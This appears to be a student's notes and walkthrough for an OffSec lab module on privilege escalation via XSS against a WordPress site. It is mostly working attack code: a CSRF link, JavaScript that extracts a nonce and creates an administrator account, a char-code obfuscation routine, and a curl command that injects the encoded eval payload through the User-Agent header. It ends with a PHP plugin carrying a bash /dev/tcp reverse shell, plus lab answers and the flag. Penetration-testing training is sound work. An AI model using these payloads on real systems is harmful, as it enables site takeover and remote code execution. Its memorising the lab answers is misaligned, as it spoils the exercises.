# Privilege Escalation via XSS

CSRF example attack
>``` shell
><a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
>```

Gathering WordPress Nonce
>``` shell
>var ajaxRequest = new XMLHttpRequest();
>var requestURL = "/wp-admin/user-new.php";
>var nonceRegex = /ser" value="([^"]*?)"/g;
>ajaxRequest.open("GET", requestURL, false);
>ajaxRequest.send();
>var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
>var nonce = nonceMatch[1];
>```

Creating a New WordPress Administrator Account
>``` shell
>var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
>ajaxRequest = new XMLHttpRequest();
>ajaxRequest.open("POST", requestURL, true);
>ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
>ajaxRequest.send(params);
>```

Minifying the XSS attack code
>``` shell
>https://jscompress.com/
>```

JS Encoding JS Function
>``` shell
>function encode_to_javascript(string) {
>            var input = string
>            var output = '';
>            for(pos = 0; pos < input.length; pos++) {
>                output += input.charCodeAt(pos);
>                if(pos != (input.length - 1)) {
>                    output += ",";
>                }
>            }
>            return output;
>        }
>        
>let encoded = encode_to_javascript('insert_minified_javascript')
>console.log(encoded)
>```

Launching the Final XSS Attack through Curl
>``` shell
>kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
>```

Lab 1 - Start Walkthrough VM 1 and replicate the steps learned in this Learning Unit to identify the basic XSS vulnerability present in the Visitors plugin. Based on the source code portion we have explored, which other HTTP header might be vulnerable to a similar XSS flaw?
>``` shell
># Map Hostname to IP
>kali@kali:~$ sudo nano /etc/hosts
>
># Add this line at the bottom:
>192.168.179.16 offsecwp
>
># Save and exit:
>Ctrl + X
>
># Navigate to http://offsecwp/?p=1 and test for an XSS vulnerability by entering the followng in the comment section:
><script>alert(1)</script>
>
># ========== Expected Result ==========
>1
># =====================================
>```
>X-Forwarded-For

Lab 2 - Start Walkthrough VM 2 and replicate the privilege escalation steps we explored in this Learning Unit to create a secondary administrator account. What is the JavaScript method responsible for interpreting a string as code and executing it? Submit the answer as the method name only, or methodName().
>``` shell
># Navigate to https://jscompress.com/ and compress the following JavaScript to a one liner:
>// Step 1: Fetch nonce from /wp-admin/user-new.php
>var ajaxRequest = new XMLHttpRequest();
>var requestURL = "/wp-admin/user-new.php";
>var nonceRegex = /ser" value="([^"]*?)"/g;
>ajaxRequest.open("GET", requestURL, false);
>ajaxRequest.send();
>var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
>var nonce = nonceMatch[1];
>
>// Step 2: Create new admin user
>var params = "action=createuser&_wpnonce_create-user=" + nonce +
>    "&user_login=attacker&email=attacker@offsec.com" +
>    "&pass1=attackerpass&pass2=attackerpass&role=administrator";
>
>ajaxRequest = new XMLHttpRequest();
>ajaxRequest.open("POST", requestURL, true);
>ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
>ajaxRequest.send(params);
>
># ========== Expected Result ==========
>var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
># =====================================
>
># Navigate to http://offsecwp/?p=1
>
># Right-click anywhere on the page, click Inspect
>
># Navigate to the "Console" tab and enter the following:
>
># 1. Define the function
>function encode_to_javascript(string) {
>    var output = '';
>    for (let i = 0; i < string.length; i++) {
>        output += string.charCodeAt(i);
>        if (i !== string.length - 1) output += ",";
>    }
>    return output;
>}
>
># 2. Assign your JavaScript payload as a string
>let payload = 'var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);';
>
># 3. Encode it
>let encoded = encode_to_javascript(payload);
>console.log(encoded);
># ========== Expected Result ==========
>118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59
># =====================================
>
># Navigate to http://offsecwp/?p=1 and enter the followng in the comment section (Creates a new administrator user: attacker / attackerpass):
><script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>
>```
>eval()

Lab 3 - Capstone Lab: Start Module Exercise VM 1 and add a new administrative account like we did in this Learning Unit. Next, craft a WordPress plugin that embeds a web shell and exploit it to enumerate the target system. Upgrade the web shell to a full reverse shell and obtain the flag located in /tmp/. Note: The WordPress instance might show slow responsiveness due to lack of internet connectivity, which is expected.
>``` shell
># Create plugin file
>kali@kali:~$ nano rev-plugin.php
>
># Paste (Replace XXX.XXX.XXX.XXX with your Kali machine’s IP):
><?php
>/*
>Plugin Name: Reverse Shell Plugin
>Description: A simple reverse shell in plugin form.
>*/
>
>exec("/bin/bash -c 'bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/4444 0>&1'");
>?>
>
># Save and exit:
>Ctrl + X
>
># Package the Plugin
>kali@kali:~$ zip rev-plugin.zip rev-plugin.php
>
># Navigate to http://offsecwp/wp-admin and login as user: attacker / attackerpass
>
># Navigate to the "Plugins" tab, then "Add New", and "Upload Plugin"
>
># Upload "rev-plugin.zip" and activate "Reverse Shell Plugin"
>
># On your Kali terminal, run:
>kali@kali:~$ nc -nlvp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
>connect to [192.168.45.236] from (UNKNOWN) [192.168.179.16] 34356
>bash: cannot set terminal process group (1): Inappropriate ioctl for device
>bash: no job control in this shell
>www-data@5417bec76fe9:/var/www/html/wp-admin$
># =====================================
>
># From the web shell, run:
>www-data@5417bec76fe9:/var/www/html/wp-admin$ cat /tmp/flag
>
># ========== Expected Result ==========
>cat /tmp/flag
>OS{f09e668c83f71a1f3d13f442285ed2a8}
># =====================================
>```
>OS{f09e668c83f71a1f3d13f442285ed2a8}
